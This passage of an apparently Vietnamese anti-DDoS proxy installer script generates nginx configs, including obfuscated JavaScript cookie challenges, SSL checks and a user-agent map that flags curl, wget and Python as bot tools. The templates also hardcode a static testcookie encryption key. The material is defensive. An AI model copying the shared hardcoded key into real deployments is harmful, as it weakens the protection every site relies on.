<script>var _0x2faa=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x35\x39\x35\x66\x33\x37\x34\x61\x34\x66\x37\x37\x39\x38\x63\x34\x31\x61\x63\x39\x37\x36\x38\x35\x39\x39\x31\x64\x33\x61\x32\x35"];function toNumbers(_0x87b8x2){var _0x87b8x3=[];_0x87b8x2[_0x2faa[1]](/(..)/g,function(_0x87b8x2){_0x87b8x3[_0x2faa[0]](parseInt(_0x87b8x2,16))});return _0x87b8x3}function toHex(){for(var _0x87b8x2=[],_0x87b8x2=1== arguments[_0x2faa[2]]&& arguments[0][_0x2faa[3]]== Array?arguments[0]:arguments,_0x87b8x3=_0x2faa[4],_0x87b8x5=0;_0x87b8x5< _0x87b8x2[_0x2faa[2]];_0x87b8x5++){_0x87b8x3+= (16> _0x87b8x2[_0x87b8x5]?_0x2faa[5]:_0x2faa[4])+ _0x87b8x2[_0x87b8x5].toString(16)};return _0x87b8x3[_0x2faa[6]]()}var b1=toNumbers(_0x2faa[7]),c1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),c2=toNumbers(c1),a1=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(a1,2,b1,c2))+"; expires=0; path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '


			confighighplus8='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 466b6fbbbda714c128e72320973037ec;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var _0xff14=["\x4E\x44\x59\x32\x59\x6A\x5A\x6D\x59\x6D\x4A\x69\x5A\x47\x45\x33\x4D\x54\x52\x6A\x4D\x54\x49\x34\x5A\x54\x63\x79\x4D\x7A\x49\x77\x4F\x54\x63\x7A\x4D\x44\x4D\x33\x5A\x57\x4D\x3D"];c2= atob(_0xff14[0]),c1= toNumbers(c2),a1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),a2=toNumbers(a1),b1=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(b1,2,c1,a2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus8='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 466b6fbbbda714c128e72320973037ec;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var _0x14da=["\x4E\x44\x59\x32\x59\x6A\x5A\x6D\x59\x6D\x4A\x69\x5A\x47\x45\x33\x4D\x54\x52\x6A\x4D\x54\x49\x34\x5A\x54\x63\x79\x4D\x7A\x49\x77\x4F\x54\x63\x7A\x4D\x44\x4D\x33\x5A\x57\x4D\x3D"];c2= atob(_0x14da[0]),c1= toNumbers(c2),a1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),a2=toNumbers(a1),b1=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(b1,2,c1,a2))+"; expires=0; path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '


			if [ $Security = 'no' ]; then
				Security='no'
				Securityline1=`cat /dev/null`
				Securityline2=`cat /dev/null`
				else
				if [ $Security = '307' ]; then
					Security='307'
					Securityline1="$config307"
					Securityline2='testcookie on;'
					else
					if [ $Security = '200' ]; then
						Security='200'
						Securityline1="$config200"
						Securityline2='testcookie on;'
						else
						if [ $Security = 'click' ]; then
							Security='click'
							Securityline1="$configclick"
							Securityline2='testcookie on;'
							else
							if [ $Security = 'high' ]; then
								Security='high'
								Securityline1="$confighigh"
								Securityline2='testcookie on;'
								else
								if [ $Security = 'high+' ]; then
									Security='high+'
									num=$(( $RANDOM % 8 + 1))
									Securityline1="$confighighplus1"
										if [ $num = '1' ]; then Securityline1="$confighighplus1"; fi
										if [ $num = '2' ]; then Securityline1="$confighighplus2"; fi
										if [ $num = '3' ]; then Securityline1="$confighighplus3"; fi
										if [ $num = '4' ]; then Securityline1="$confighighplus4"; fi
										if [ $num = '5' ]; then Securityline1="$confighighplus5"; fi
										if [ $num = '6' ]; then Securityline1="$confighighplus6"; fi
										if [ $num = '7' ]; then Securityline1="$confighighplus7"; fi
										if [ $num = '8' ]; then Securityline1="$confighighplus8"; fi
									Securityline2='testcookie on;'
									else
									if [ $Security = '5s' ]; then
										Security='5s'
										Securityline1="$config5s"
										Securityline2='testcookie on;'
										else
										if [ $Security = '5s+' ]; then
											Security='5s+'
											num=$(( $RANDOM % 8 + 1))
											Securityline1="$config5splus1"
												if [ $num = '1' ]; then Securityline1="$config5splus1"; fi
												if [ $num = '2' ]; then Securityline1="$config5splus2"; fi
												if [ $num = '3' ]; then Securityline1="$config5splus3"; fi
												if [ $num = '4' ]; then Securityline1="$config5splus4"; fi
												if [ $num = '5' ]; then Securityline1="$config5splus5"; fi
												if [ $num = '6' ]; then Securityline1="$config5splus6"; fi
												if [ $num = '7' ]; then Securityline1="$config5splus7"; fi
												if [ $num = '8' ]; then Securityline1="$config5splus8"; fi
											Securityline2='testcookie on;'
											else
											if [ $Security = 'captcha' ]; then
													if [ ! -f /vddos/conf.d/recaptcha-sitekey.conf ]; then
														echo 'ERROR!'
														echo 'Please login https://www.google.com/recaptcha/admin#list'
														echo 'Input your '$Website' reCaptcha Site key to /vddos/conf.d/recaptcha-sitekey.conf'
														echo 'Input your '$Website' reCaptcha Secret key to /vddos/conf.d/recaptcha-secretkey.conf'
														deletefileconf
														exit 0
													fi
													if [ ! -f /vddos/conf.d/recaptcha-secretkey.conf ]; then
														echo 'ERROR!'
														echo 'Please login https://www.google.com/recaptcha/admin#list'
														echo 'Input your '$Website' reCaptcha Site key to /vddos/conf.d/recaptcha-sitekey.conf'
														echo 'Input your '$Website' reCaptcha Secret key to /vddos/conf.d/recaptcha-secretkey.conf'
														deletefileconf
														exit 0
													fi
													Security='captcha'
													Securityline1="$configcaptcha"
													Securityline2='testcookie on;'
													Securityline3=`awk -F: "/$Website/" /vddos/conf.d/recaptcha-sitekey.conf |awk 'NR==1 {print $2}'`
													if [ "$Securityline3" = "" ]; then
														echo 'ERROR!'
														echo 'Please login https://www.google.com/recaptcha/admin#list'
														echo 'Input your '$Website' reCaptcha Site key to /vddos/conf.d/recaptcha-sitekey.conf'
														echo 'Input your '$Website' reCaptcha Secret key to /vddos/conf.d/recaptcha-secretkey.conf'
														deletefileconf
														exit 0
													fi
												else
												if [ $Security = 'captcha+' ]; then
														if [ ! -f /vddos/conf.d/recaptcha-sitekey.conf ]; then
															echo 'ERROR!'
															echo 'Please login https://www.google.com/recaptcha/admin#list'
															echo 'Input your '$Website' reCaptcha Site key to /vddos/conf.d/recaptcha-sitekey.conf'
															echo 'Input your '$Website' reCaptcha Secret key to /vddos/conf.d/recaptcha-secretkey.conf'
															deletefileconf
															exit 0
														fi
														if [ ! -f /vddos/conf.d/recaptcha-secretkey.conf ]; then
															echo 'ERROR!'
															echo 'Please login https://www.google.com/recaptcha/admin#list'
															echo 'Input your '$Website' reCaptcha Site key to /vddos/conf.d/recaptcha-sitekey.conf'
															echo 'Input your '$Website' reCaptcha Secret key to /vddos/conf.d/recaptcha-secretkey.conf'
															deletefileconf
															exit 0
														fi
														Security='captcha+'
														Securityline1="$configcaptchaplus"
														Securityline2='testcookie on;'
														Securityline3=`awk -F: "/$Website/" /vddos/conf.d/recaptcha-sitekey.conf |awk 'NR==1 {print $2}'`
														if [ "$Securityline3" = "" ]; then
															echo 'ERROR!'
															echo 'Please login https://www.google.com/recaptcha/admin#list'
															echo 'Input your '$Website' reCaptcha Site key to /vddos/conf.d/recaptcha-sitekey.conf'
															echo 'Input your '$Website' reCaptcha Secret key to /vddos/conf.d/recaptcha-secretkey.conf'
															deletefileconf
															exit 0
														fi
													else
													echo 'ERROR!'
													echo "$Security line $dong in $ten_file_chua_list
Please choose a valid for Security Level Protection: no|307|200|click|5s|high|captcha
													"
													exit 0
												fi
											fi
										fi
									fi
								fi
							fi
						fi
					fi
				fi
			fi


			# Kiểm tra sự hợp lệ của SSL_Prikey và SSL_CRTkey nếu có xài https?
			if [ $ListenHTTPorHTTPS = 'https' ]; then
				if [ $SSL_Prikey != 'LetEncrypt' ]; then
					if [ ! -f $SSL_Prikey ]; then
						echo 'ERROR!'
						echo "$SSL_Prikey line $dong in $ten_file_chua_list
						"
						exit 0
					fi
					if [ ! -f $SSL_CRTkey ]; then
						echo 'ERROR!'
						echo "$SSL_CRTkey line $dong in $ten_file_chua_list
						"
						exit 0
					fi


				fi

				if [ $SSL_Prikey = 'LetEncrypt' ]; then
					SSL_Prikey='/vddos/ssl/'$Website'.pri'
					SSL_CRTkey='/vddos/ssl/'$Website'.crt'

					

					
				fi

				PRI=`openssl rsa -in $SSL_Prikey -modulus -noout | openssl md5`
				CRT=`openssl x509 -in $SSL_CRTkey -modulus -noout | openssl md5`

				if [ "$PRI" != "$CRT" ]; then
					echo 'ERROR!'
					echo "$SSL_Prikey line $dong in $ten_file_chua_list"
					echo "$SSL_CRTkey line $dong in $ten_file_chua_list"
					echo "$SSL_Prikey and $SSL_CRTkey not belong together
					"
					exit 0
				fi

			fi



			# Nếu pass hết tất cả các test trên thì tiến hành tạo file cấu hình /vddos/conf.d/*.vddos.conf cho dòng cấu hình diện tại
			if [ $ListenHTTPorHTTPS = 'http' ]; then # Nếu là HTTP
				Listenconfig=`echo $Listen | awk '{print substr($0,8,21)}'`  >/dev/null 2>&1
				touch /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				echo '%Cacheconfig4%
server {
    listen      %Listenconfig%;
    server_name %Websiteconfig1%;
    access_log     /var/log/vddos/444.log main if=$statusblock;
    access_log     /var/log/vddos/%Websiteconfig2%.access.log main if=$statusnormal;
    error_log  /var/log/vddos/%Websiteconfig2%.error.log error;

	location /444.html {
	return 444;
	}
    location ^~ /error/ {
        root /vddos/html;
        allow all;
    }
	location ^~ /.well-known/acme-challenge/ {
		default_type "text/plain";
		root /vddos/letsencrypt;
	}
	location /%status_monitor%-status-monitor {
    stub_status;
	}

	vhost_traffic_status_filter_by_set_key $filter_user_agent agent::$server_name;
	
	location /%vddos_monitor%-vddos-monitor {
	vhost_traffic_status_display;
	vhost_traffic_status_display_format html;
	}

	location /%vddos_monitor%-tcp-udp-vddos-monitor {
    stream_server_traffic_status_display;
    stream_server_traffic_status_display_format html;
	}

    include             /vddos/conf.d/redirect.conf;
	%Securityline1%
    location / {
		if ($allowed_country = no) {
		return 403;
		}

    	include /vddos/conf.d/waf.conf;
		%Securityline2%
		proxy_set_header   Host             $host;
		proxy_set_header   X-Real-IP        $remote_addr;
		proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
        proxy_pass      %Backendconfig%;
		%Cacheconfig1%

    }


    location ~ /\.ht    {return 404;}
    location ~ /\.svn/  {return 404;}
    location ~ /\.git/  {return 404;}
    location ~ /\.hg/   {return 404;}
    location ~ /\.bzr/  {return 404;}

}
				' > /vddos/conf.d/$Website2-$Listenconfig.vddos.conf
				
				Websiteconfig1="$Website1"  >/dev/null 2>&1
				Websiteconfig2="$Website2"  >/dev/null 2>&1
				
				Backendconfig="$Backend"  >/dev/null 2>&1
				echo '' > temp36354633456.txt
				echo "$Securityline1" > temp36354633456.txt
				sed -i '/%Securityline1%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%Securityline1%.*//" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				
				echo '' > temp36354633456.txt
				echo "$Securityline2" > temp36354633456.txt
				sed -i '/%Securityline2%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%Securityline2%.*//" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1

				sed -i "s#%Securityline3%#$Securityline3#g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				
				echo '' > temp36354633456.txt
				echo "`cat /vddos/conf.d/whitelist-botsearch.conf`" > temp36354633456.txt
				sed -i '/%testcookie_whitelist%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%testcookie_whitelist%.*//" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				
				
				echo '' > temp36354633456.txt
				echo "$Cacheconfig1" > temp36354633456.txt
				sed -i '/%Cacheconfig1%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%Cacheconfig1%.*//" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1

				rm -rf temp36354633456.txt  >/dev/null 2>&1
				sed -i "s#%Cacheconfig2%#$Cacheconfig2#g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s#%Cacheconfig3%#$Cacheconfig3#g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s#%Cacheconfig4%#$Cacheconfig4#g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				random=$(cat /dev/urandom | tr -cd '0-9' | head -c 10)
				sed -i "s/%Cacheconfig5%/$random/g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				random=$(cat /dev/urandom | tr -cd '0-9' | head -c 50)
				sed -i "s/%testcookie_secret%/$random/g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s/%Websiteconfig1%/$Websiteconfig1/g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s/%Websiteconfig2%/$Websiteconfig2/g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s/%Listenconfig%/$Listenconfig/g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s#%Backendconfig%#$Backendconfig#g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				random=$(echo -n "`hostname -f``hostname -I``TZ=Asia/Ho_Chi_Minh date +"DATE-%m-%Y"`$Website$Backend" | md5sum | cut -c 1-10)
				sed -i "s/%status_monitor%/$random/g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				echo 'Website "'$Website'" Status: http://'$Website'/'$random'-status-monitor' >> /vddos/vDDoS_Monitor.txt


				sed -i "s/%vddos_monitor%/$vddos_monitor_random/g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1

					# Cấu hình thêm cho một vài mode đặc biệt:
				if [ "$Security" = 'high+' ] || [ "$Security" = '5s+' ]; then
				xxxgoc_testcookie_refresh_encrypt_cookie_iv=`echo "$(echo -n "$(cat /dev/urandom | tr -cd 'a-z0-9' | head -c 2014)" | md5sum | cut -d " " -f 1)"`
				#echo $xxxgoc_testcookie_refresh_encrypt_cookie_iv
				xxxen_testcookie_refresh_encrypt_cookie_iv=`echo -n $xxxgoc_testcookie_refresh_encrypt_cookie_iv | base64`
				#echo $xxxen_testcookie_refresh_encrypt_cookie_iv
				xxxgiai_testcookie_refresh_encrypt_cookie_iv=`echo -n $xxxen_testcookie_refresh_encrypt_cookie_iv | base64 -d`
				#echo $xxxgiai_testcookie_refresh_encrypt_cookie_iv
				sed -i "s#%xxxgoc_testcookie_refresh_encrypt_cookie_iv%#$xxxgoc_testcookie_refresh_encrypt_cookie_iv#g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1
				sed -i "s#%xxxen_testcookie_refresh_encrypt_cookie_iv%#$xxxen_testcookie_refresh_encrypt_cookie_iv#g" /vddos/conf.d/$Website2-$Listenconfig.vddos.conf  >/dev/null 2>&1

				fi

			fi

			if [ $ListenHTTPorHTTPS = 'https' ]; then # Nếu là HTTPS
				Listenconfig=`echo $Listen | awk '{print substr($0,9,21)}'`  >/dev/null 2>&1
				touch /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf
				echo '%Cacheconfig4%
server {
    listen      %Listenconfig% ssl http2;
    server_name %Websiteconfig1%;
    ssl         on;
    ssl_certificate      %SSL_CRTkeyconfig%;
    ssl_certificate_key  %SSL_Prikeyconfig%;
    access_log     /var/log/vddos/444.log main if=$statusblock;
    access_log     /var/log/vddos/%Websiteconfig2%.access.log main if=$statusnormal;
    error_log  /var/log/vddos/%Websiteconfig2%.error.log error;

	location /444.html {
	return 444;
	}
    location ^~ /error/ {
        root /vddos/html;
        allow all;
    }
	location ^~ /.well-known/acme-challenge/ {
		default_type "text/plain";
		root /vddos/letsencrypt;
	}
	location /%status_monitor%-status-monitor {
    stub_status;
	}

	vhost_traffic_status_filter_by_set_key $filter_user_agent agent::$server_name;
	
	location /%vddos_monitor%-vddos-monitor {
	vhost_traffic_status_display;
	vhost_traffic_status_display_format html;
	}

	location /%vddos_monitor%-tcp-udp-vddos-monitor {
    stream_server_traffic_status_display;
    stream_server_traffic_status_display_format html;
	}

    include             /vddos/conf.d/redirect.conf;
	%Securityline1%
    location / {
		if ($allowed_country = no) {
		return 403;
		}
    	include /vddos/conf.d/waf.conf;
		%Securityline2%
		proxy_set_header   Host             $host;
		proxy_set_header   X-Real-IP        $remote_addr;
		proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;
        proxy_pass      %Backendconfig%;
		%Cacheconfig1%

    }



    location ~ /\.ht    {return 404;}
    location ~ /\.svn/  {return 404;}
    location ~ /\.git/  {return 404;}
    location ~ /\.hg/   {return 404;}
    location ~ /\.bzr/  {return 404;}

}
				' > /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf
				
				Websiteconfig1="$Website1"  >/dev/null 2>&1
				Websiteconfig2="$Website2"  >/dev/null 2>&1
				
				Backendconfig=$Backend  >/dev/null 2>&1
				SSL_CRTkeyconfig=$SSL_CRTkey  >/dev/null 2>&1
				SSL_Prikeyconfig=$SSL_Prikey  >/dev/null 2>&1
				
				echo '' > temp36354633456.txt
				echo "$Securityline1" > temp36354633456.txt
				sed -i '/%Securityline1%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%Securityline1%.*//" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				
				echo '' > temp36354633456.txt
				echo "$Securityline2" > temp36354633456.txt
				sed -i '/%Securityline2%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%Securityline2%.*//" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1

				sed -i "s#%Securityline3%#$Securityline3#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				
				echo '' > temp36354633456.txt
				echo "`cat /vddos/conf.d/whitelist-botsearch.conf`" > temp36354633456.txt
				sed -i '/%testcookie_whitelist%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%testcookie_whitelist%.*//" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				
				echo '' > temp36354633456.txt
				echo "$Cacheconfig1" > temp36354633456.txt
				sed -i '/%Cacheconfig1%/r temp36354633456.txt' /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s/.*%Cacheconfig1%.*//" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1

				rm -rf temp36354633456.txt  >/dev/null 2>&1
				sed -i "s#%Cacheconfig2%#$Cacheconfig2#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s#%Cacheconfig3%#$Cacheconfig3#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s#%Cacheconfig4%#$Cacheconfig4#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				random=$(cat /dev/urandom | tr -cd '0-9' | head -c 10)
				sed -i "s/%Cacheconfig5%/$random/g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				
				random=$(cat /dev/urandom | tr -cd '0-9' | head -c 50)
				sed -i "s/%testcookie_secret%/$random/g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s/%Websiteconfig1%/$Websiteconfig1/g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s/%Websiteconfig2%/$Websiteconfig2/g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s/%Listenconfig%/$Listenconfig/g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s#%Backendconfig%#$Backendconfig#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s#%SSL_CRTkeyconfig%#$SSL_CRTkeyconfig#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s#%SSL_Prikeyconfig%#$SSL_Prikeyconfig#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1

				random=$(echo -n "`hostname -f``hostname -I``TZ=Asia/Ho_Chi_Minh date +"DATE-%m-%Y"`$Website$Backend" | md5sum | cut -c 1-10)
				sed -i "s/%status_monitor%/$random/g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				echo 'Website "'$Website'" Status: https://'$Website'/'$random'-status-monitor' >> /vddos/vDDoS_Monitor.txt

				sed -i "s/%vddos_monitor%/$vddos_monitor_random/g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1


				# Cấu hình thêm cho một vài mode đặc biệt:
				if [ "$Security" = 'high+' ] || [ "$Security" = '5s+' ]; then
				xxxgoc_testcookie_refresh_encrypt_cookie_iv=`echo "$(echo -n "$(cat /dev/urandom | tr -cd 'a-z0-9' | head -c 2014)" | md5sum | cut -d " " -f 1)"`
				#echo $xxxgoc_testcookie_refresh_encrypt_cookie_iv
				xxxen_testcookie_refresh_encrypt_cookie_iv=`echo -n $xxxgoc_testcookie_refresh_encrypt_cookie_iv | base64`
				#echo $xxxen_testcookie_refresh_encrypt_cookie_iv
				xxxgiai_testcookie_refresh_encrypt_cookie_iv=`echo -n $xxxen_testcookie_refresh_encrypt_cookie_iv | base64 -d`
				#echo $xxxgiai_testcookie_refresh_encrypt_cookie_iv

				sed -i "s#%xxxgoc_testcookie_refresh_encrypt_cookie_iv%#$xxxgoc_testcookie_refresh_encrypt_cookie_iv#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1
				sed -i "s#%xxxen_testcookie_refresh_encrypt_cookie_iv%#$xxxen_testcookie_refresh_encrypt_cookie_iv#g" /vddos/conf.d/$Website2-$Listenconfig.ssl.vddos.conf  >/dev/null 2>&1

				fi
				
			fi

		fi
		#
		dong=$((dong + 1))
	done
	

	# Tạo file DB cho VTS Monitor:
	if [ ! -f /vMonitor.DB ]; then
	touch /vMonitor.DB
	chown vddos:vddos /vMonitor.DB
	chmod 700 /vMonitor.DB
	touch /vddos/vddos.conf
	fi
	vMonitormemoryuse=$((`cat /proc/meminfo|grep MemTotal|awk {'print $2'}`/1))
	if [ $vMonitormemoryuse -lt 1 ] ; then
		vMonitormemoryuse=1
	fi

	# Tạo file cấu hình cho /vddos/vddos.conf:

	echo '#load_module "modules/ngx_http_testcookie_access_module.so";
#load_module "modules/ngx_http_geoip_module.so";
# Server globals
user                    vddos;
worker_processes        auto;
error_log               /var/log/vddos/error.log;
pid                     /var/run/vddos.pid;


# Worker config
events {
        worker_connections  '$(ulimit -n)';
        use                 epoll;
        multi_accept 		on;
}


http {
	stream_server_traffic_status_zone shared:vhost_traffic_status:'$vMonitormemoryuse'm;

	vhost_traffic_status_zone;
	vhost_traffic_status_dump /vMonitor.DB;

	map $http_user_agent $filter_user_agent {
		default "Other";
		~*(OpenBSD|FreeBSD) "Unix Browser";
		~*(NOKIA|Lumia) "Windows Phone";
		~*Android "Android Browser";
		~*(iPhone|iPad) "iOS Browser";
		~*(Edge|MSIE|Windows) "Windows Browser";
		~*(Macintosh|Safari) "MAC OS Browser";
		~*(curl|wget|Java|BinGet|perl|Peach|PHP|pxyscand|Python) "Bot Tools";
		~*(www|http|.com|.net|.org|Google|bing|search|bot|yahoo|yandex) "BotSearch Browser";
		~*Mobile "Mobile Browser";
		~*Linux "Linux Browser";
	}
	
	vhost_traffic_status_filter_by_set_key $geoip_country_code country::*;
	#vhost_traffic_status_filter_by_set_key $remote_addr ip_addr::*;
	
    include      /vddos/conf.d/cdn-ip.conf;
	include      /vddos/conf.d/limit-conn.conf;
    include      /vddos/conf.d/blacklist-countrycode.conf;

    # Main settings
    sendfile                        on;
    tcp_nopush                      on;
    tcp_nodelay                     on;
    client_header_timeout           1m;
    client_body_timeout             1m;
    client_header_buffer_size       2k;
    client_body_buffer_size         256k;
    client_max_body_size 			100m;
    large_client_header_buffers     4   8k;
    send_timeout                    30;
    keepalive_timeout               15 15;
    reset_timedout_connection       on;
    server_tokens                   off;
    server_name_in_redirect         off;
    server_names_hash_max_size      512;
    server_names_hash_bucket_size   512;

    # Mime settings
    include             /vddos/mime.types;
    default_type        application/octet-stream;

    # WAF Naxsi
    include      /vddos/naxsi_core.rules;

    # Compression
    gzip                on;
    gzip_comp_level     9;
    gzip_min_length     512;
    gzip_buffers        8 64k;
    gzip_types          text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript image/svg+xml application/x-font-ttf font/opentype;
    gzip_proxied        any;


    # Proxy settings
    proxy_redirect      off;
    proxy_set_header    Host            $host;
